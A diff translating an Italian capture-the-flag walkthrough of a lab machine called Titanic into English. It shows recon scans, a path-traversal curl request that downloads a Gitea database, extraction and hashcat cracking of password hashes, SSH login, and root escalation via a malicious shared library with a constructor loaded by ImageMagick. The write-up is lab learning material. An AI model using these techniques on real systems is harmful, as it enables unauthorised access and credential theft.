@@ -1,34 +1,34 @@
-# 🛳️Titanic CTF -  Walkthrough
+# 🛳️Titanic CTF - Walkthrough
 
-## 🕵️‍♂️ Primo Step: Ricognizione
+## 🕵️‍♂️ Initial Reconnaissance
 
-La prima cosa che ho fatto è stata una scansione della rete con **nmap** per individuare porte aperte e servizi attivi.
+The first thing I did was a network scan with **nmap** to identify open ports and active services.
 
 ```bash
 nmap -sC -sV -A 10.10.11.55
 ```
 
-L'output non ha rivelato nulla di particolarmente interessante, quindi ho deciso di analizzare il sito web principale. Dopo un'ispezione manuale senza successo, ho eseguito una scansione con **Gobuster** per cercare sottodomini.
+The output didn't reveal anything particularly interesting, so I decided to analyze the main website. After a manual inspection without success, I performed a scan with **Gobuster** to look for subdomains.
 
 ```bash
 gobuster dns -d titanic.htb -w common.txt
 ```
 
-Grazie a questa scansione, ho trovato un sottodominio chiamato `dev`.
+Thanks to this scan, I found a subdomain called `dev`.
 
-Visitando `dev.<target>`, ho scoperto che si trattava di un'istanza di **Gitea**, una piattaforma simile a GitHub per il versionamento del codice. Esplorando il repository pubblico, ho individuato un utente chiamato `developer`, che potrebbe essere interessante.
+Visiting `dev.<target>`, I discovered that it was an instance of **Gitea**, a platform similar to GitHub for code versioning. Exploring the public repository, I identified a user called `developer`, which could be interesting.
 
-Scorrendo tra i file caricati, ho trovato dei file di configurazione, uno relativo a **Gitea** e un altro a **MySQL**.
+Scrolling through the uploaded files, I found configuration files, one related to **Gitea** and another to **MySQL**.
 
-## 📂 Accesso al Database
+## 📂 Database Access
 
-Ho tentato di connettermi direttamente a MySQL, ma la porta non era aperta. Tuttavia, consultando la documentazione di Gitea, ho scoperto che il database `gitea.db` si trova nel percorso `data/gitea`. Ho provato a scaricarlo con **curl**:
+I tried to connect directly to MySQL, but the port was not open. However, by consulting the Gitea documentation, I discovered that the `gitea.db` database is located at `data/gitea`. I tried to download it with **curl**:
 
 ```bash
 curl -s "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db" -o gitea.db
 ```
 
-Aprendo il database con **sqlite3**, ho trovato la tabella `user` contenente gli hash delle password.
+Opening the database with **sqlite3**, I found the `user` table containing password hashes.
 
 ```bash
 sqlite3 gitea.db
@@ -36,25 +36,25 @@ sqlite> .tables
 sqlite> SELECT name, passwd, salt FROM user;
 ```
 
-L'hash della password era in un formato specifico di Gitea. Per decodificarlo in un formato leggibile da **hashcat**, ho usato uno script Python trovato su GitHub ([gitea2hashcat.py](https://github.com/unix-ninja/hashcat/blob/master/tools/gitea2hashcat.py)).
+The password hash was in a specific Gitea format. To decode it into a format readable by **hashcat**, I used a Python script found on GitHub ([gitea2hashcat.py](https://github.com/unix-ninja/hashcat/blob/master/tools/gitea2hashcat.py)).
 
-Dopo la conversione, ho lanciato **hashcat** per effettuare un attacco brute-force usando la wordlist `rockyou.txt`.
+After conversion, I launched **hashcat** to perform a brute-force attack using the `rockyou.txt` wordlist.
 
 ```bash
 hashcat -m 10900 hash.txt rockyou.txt
 ```
 
-Dopo qualche minuto, ho trovato la password: **25282528**.
+After a few minutes, I found the password: **25282528**.
 
-## 🔑 Accesso SSH e User Flag
+## 🔑 SSH Access and User Flag
 
-Ora che ho una password valida, ho provato ad accedere tramite SSH all'utente `developer`:
+Now that I have a valid password, I tried to access the `developer` user via SSH:
 
 ```bash
 ssh developer@10.10.11.55
 ```
 
-Una volta dentro, ho esplorato la directory home dell'utente e ho trovato la **user flag**!
+Once inside, I explored the user's home directory and found the **user flag**!
 
 ```bash
 cat user.txt
@@ -62,23 +62,23 @@ cat user.txt
 
 ## 🚀 Privilege Escalation
 
-Per ottenere i privilegi di root, ho iniziato controllando i permessi di `sudo`:
+To gain root privileges, I started by checking `sudo` permissions:
 
 ```bash
 sudo -l
 ```
 
-Purtroppo, non ho trovato comandi eseguibili senza password. Ho quindi esplorato il sistema in cerca di file o processi interessanti.
+Unfortunately, I found no commands executable without a password. I then explored the system looking for interesting files or processes.
 
-Dopo un po' di ricerca, ho trovato un file che utilizza una versione vulnerabile di **ImageMagick**.
+After some searching, I found a file that uses a vulnerable version of **ImageMagick**.
 
-## 🎨 Exploit di ImageMagick
+## 🎨 ImageMagick Exploit
 
-Per sfruttare la vulnerabilità di ImageMagick, ho utilizzato un approccio basato su una libreria condivisa malevola. In pratica, ImageMagick carica dinamicamente alcune librerie durante l'elaborazione delle immagini, e possiamo sfruttare questa caratteristica per eseguire codice arbitrario.
+To exploit the ImageMagick vulnerability, I used an approach based on a malicious shared library. In practice, ImageMagick dynamically loads some libraries during image processing, and we can leverage this feature to execute arbitrary code.
 
-### 🛠 Creazione del Payload
+### 🛠 Payload Creation
 
-Ho creato una libreria condivisa (`libxcb.so.1`) contenente il codice malevolo che copia il file `root.txt` in `/tmp/root.txt`. Ho compilato il file con il seguente comando:
+I created a shared library (`libxcb.so.1`) containing malicious code that copies the `root.txt` file to `/tmp/root.txt`. I compiled the file with the following command:
 
 ```bash
 gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
@@ -91,12 +91,12 @@ __attribute__((constructor)) void init(){
 EOF
 ```
 
-### 📌 Esecuzione dell'Exploit
+### 📌 Exploit Execution
 
-Una volta che ImageMagick ha elaborato questo file malevolo, il codice all'interno del **costruttore** (`__attribute__((constructor))`) è stato eseguito automaticamente. Questo ha permesso di copiare il contenuto di `root.txt` nella directory `/tmp`, rendendolo leggibile.
+Once ImageMagick processed this malicious file, the code within the **constructor** (`__attribute__((constructor))`) was automatically executed. This allowed the content of `root.txt` to be copied to the `/tmp` directory, making it readable.
 
-In alternativa, avrei potuto incorporare un **reverse shell** nello stesso payload per ottenere un accesso interattivo alla macchina come utente root.
+Alternatively, I could have embedded a **reverse shell** in the same payload to gain interactive access to the machine as the root user.
 
-## 🎯 Conclusione
+## 🎯 Conclusion
 
-Questa macchina ha richiesto un mix di tecniche di **ricognizione**, **exploit di Gitea**, **cracking di hash**, e **privilege escalation tramite ImageMagick**. È stata una sfida interessante che ha messo alla prova diverse competenze. 🚀
+This machine required a mix of **reconnaissance**, **Gitea exploit**, **hash cracking**, and **privilege escalation via ImageMagick** techniques. It was an interesting challenge that tested various skills. 🚀
